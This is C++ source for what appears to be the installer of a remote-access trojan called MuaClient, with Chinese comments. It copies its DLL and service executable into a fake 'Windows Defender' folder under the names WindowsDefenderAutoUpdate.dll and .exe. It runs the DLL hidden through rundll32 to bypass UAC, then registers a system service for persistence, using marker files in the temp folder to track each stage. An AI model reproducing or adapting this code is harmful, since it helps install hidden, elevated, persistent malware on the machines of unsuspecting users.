// InstallMuaClient.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h> 
#include <atlconv.h>
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

#include "SystemService.h"


// 安装前需要使得Install.exe, MuaClient.dll, SystemService.exe三者在同一目录下

int main()
{
	// 创建互斥量
	HANDLE hMutex = CreateMutex(NULL, TRUE, L"{7F2E19A4-3D8B-42C6-AD5E-0C9F34B812D7}");
	WaitForSingleObject(hMutex, INFINITE);

	WCHAR pszWillBypassUAC[] = L"{4A9B1F2C-D3E6-4F8A-95C7-12B408E76D43}";
	WCHAR pszInstallCompleted[] = L"{E6C45A1D-9F47-4C2B-B321-8A0D4B89F1E2}";

	// 安装早已完成，直接退出
	WCHAR pszTempPathInstallCompleted[MAX_PATH];
	// C:\Users\iyzyi\AppData\Local\Temp
	GetTempPath(MAX_PATH, pszTempPathInstallCompleted);	
	wcscat_s(pszTempPathInstallCompleted, pszInstallCompleted);
	if (PathFileExists(pszTempPathInstallCompleted)) {
		return -1;
	}

	WCHAR pszTempPathWillBypassUAC[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathWillBypassUAC);
	wcscat_s(pszTempPathWillBypassUAC, pszWillBypassUAC);

	// 第一次，未提权
	if (!PathFileExists(pszTempPathWillBypassUAC)) {
		// 创建 %TEMP%\pszWillBypassUAC 文件，表示即将BypassUAC
		HANDLE hFile = CreateFile(pszTempPathWillBypassUAC, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != nullptr) {
			CloseHandle(hFile);
		}

		WCHAR pszInstallFilePath[MAX_PATH];
		GetModuleFileName(NULL, pszInstallFilePath, MAX_PATH);


		// 程序所在目录
		WCHAR pszFileDir[MAX_PATH];
		GetModuleFileName(NULL, pszFileDir, MAX_PATH);
		WCHAR *pPos = NULL;
		pPos = wcsrchr(pszFileDir, '\\');
		*pPos = NULL;

		WCHAR pszMuaClientDllPath[MAX_PATH];
		WCHAR pszSystemServiceExePath[MAX_PATH];
		wcscpy_s(pszMuaClientDllPath, pszFileDir);
		wcscpy_s(pszSystemServiceExePath, pszFileDir);

		// 拼接成MuaClient.dll和SystemService.exe的路径
		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");
		wcscat_s(pszSystemServiceExePath, L"\\SystemService.exe");

		// MuaClient.dll和SystemService.exe不在当前目录则退出安装程序
		if (!(PathFileExists(pszMuaClientDllPath) && PathFileExists(pszSystemServiceExePath))) {
			return -1;
		}

		// C:\Users\iyzyi\AppData\Roaming
		WCHAR pszNewMuaClientDllPath[MAX_PATH];
		WCHAR pszNewSystemServiceExePath[MAX_PATH];
		SHGetSpecialFolderPath(NULL, pszNewMuaClientDllPath, CSIDL_APPDATA, FALSE);
		SHGetSpecialFolderPath(NULL, pszNewSystemServiceExePath, CSIDL_APPDATA, FALSE);

		// C:\Users\iyzyi\AppData\Roaming\Windows Defender
		wcscat_s(pszNewMuaClientDllPath, L"\\Windows Defender");
		wcscat_s(pszNewSystemServiceExePath, L"\\Windows Defender");
		if (!PathIsDirectory(pszNewMuaClientDllPath)) {			//不存在则创建文件夹
			CreateDirectory(pszNewMuaClientDllPath, NULL);
		}

		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll
		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");
		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.exe
		wcscat_s(pszNewSystemServiceExePath, L"\\WindowsDefenderAutoUpdate.exe");

		// 第三个参数表示覆盖旧文件
		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);
		CopyFile(pszSystemServiceExePath, pszNewSystemServiceExePath, FALSE);

		//// 本程序所在路径
		//WCHAR pszThisProgramPath[MAX_PATH];
		//GetModuleFileName(NULL, pszThisProgramPath, MAX_PATH);

		// 提权后再次运行此程序
		//CMLuaUtilBypassUAC(pszThisProgramPath);
		CHAR szCmdLine[MAX_PATH] = { 0 };
		CHAR szRundll32Path[MAX_PATH] = "C:\\Windows\\System32\\rundll32.exe";
		//CHAR szDllPath[MAX_PATH] = "MuaClient.dll";
		USES_CONVERSION;
		sprintf_s(szCmdLine, "%s \"%s\" %s %s", szRundll32Path, W2A(pszNewMuaClientDllPath), "_WindowsUpdate@16", W2A(pszInstallFilePath));
		WinExec(szCmdLine, SW_HIDE);
	}

	// 非第一次，已提权
	else {

		WCHAR pszNewSystemServiceExePath[MAX_PATH];
		SHGetSpecialFolderPath(NULL, pszNewSystemServiceExePath, CSIDL_APPDATA, FALSE);
		wcscat_s(pszNewSystemServiceExePath, L"\\Windows Defender\\WindowsDefenderAutoUpdate.exe");

		// 注册系统服务
		RegisterSystemService(pszNewSystemServiceExePath);
		
		//删掉这个用于表示BypassUAC的文件
		if (PathFileExists(pszTempPathWillBypassUAC)) {
			DeleteFile(pszTempPathWillBypassUAC);
		}
			
		// 安装完了，创建 %TEMP%\pszInstallCompleted文件
		HANDLE hFile = CreateFile(pszTempPathInstallCompleted, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != nullptr) {
			CloseHandle(hFile);
		}
	}

	// 释放互斥量
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	hMutex = nullptr;

	return 0;
}